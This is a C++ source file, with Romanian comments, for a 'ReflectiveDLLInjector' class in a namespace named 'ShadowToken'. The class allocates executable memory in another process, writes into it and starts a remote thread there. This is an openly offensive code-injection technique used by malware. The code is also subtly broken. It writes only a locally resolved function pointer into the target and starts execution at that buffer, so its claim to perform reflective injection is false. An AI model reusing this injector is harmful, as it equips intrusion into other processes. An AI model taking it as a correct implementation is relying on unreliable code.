#include <Windows.h>
#include <iostream>
#include <string>

namespace ShadowToken {

    class ReflectiveDLLInjector {
    public:
        ReflectiveDLLInjector() = default;

        // Realizează injecția DLL-ului în procesul țintă folosind injecție reflexivă
        bool InjectDLL(HANDLE processHandle, const std::wstring& dllPath) {
            // Încărcare DLL din resursele locale în memorie
            HMODULE hModule = LoadLibrary(dllPath.c_str());
            if (!hModule) {
                std::cerr << "[Error] Nu s-a putut încărca DLL-ul în memorie: " << GetLastError() << std::endl;
                return false;
            }

            // Obține adresa funcției de intrare a DLL-ului (reflective loader)
            FARPROC reflectiveLoader = GetProcAddress(hModule, "ReflectiveLoader");
            if (!reflectiveLoader) {
                std::cerr << "[Error] Nu s-a putut găsi punctul de intrare ReflectiveLoader: " << GetLastError() << std::endl;
                FreeLibrary(hModule);
                return false;
            }

            // Alocă memorie în procesul țintă
            LPVOID remoteBuffer = VirtualAllocEx(processHandle, nullptr, sizeof(hModule), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteBuffer) {
                std::cerr << "[Error] Nu s-a putut aloca memorie în procesul țintă: " << GetLastError() << std::endl;
                FreeLibrary(hModule);
                return false;
            }

            // Scrie adresa DLL-ului în memoria procesului țintă
            if (!WriteProcessMemory(processHandle, remoteBuffer, &reflectiveLoader, sizeof(reflectiveLoader), nullptr)) {
                std::cerr << "[Error] Nu s-a putut scrie DLL-ul în memoria procesului țintă: " << GetLastError() << std::endl;
                VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
                FreeLibrary(hModule);
                return false;
            }

            // Creează un thread în procesul țintă pentru a executa DLL-ul injectat
            HANDLE hRemoteThread = CreateRemoteThread(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, nullptr);
            if (!hRemoteThread) {
                std::cerr << "[Error] Nu s-a putut crea thread-ul remote: " << GetLastError() << std::endl;
                VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
                FreeLibrary(hModule);
                return false;
            }

            // Așteaptă ca thread-ul să finalizeze execuția
            WaitForSingleObject(hRemoteThread, INFINITE);
            CloseHandle(hRemoteThread);

            // Eliberarea memoriei și a resurselor
            VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
            FreeLibrary(hModule);

            std::cout << "[Info] Injectare reflexivă a DLL-ului realizată cu succes." << std::endl;
            return true;
        }
    };
}
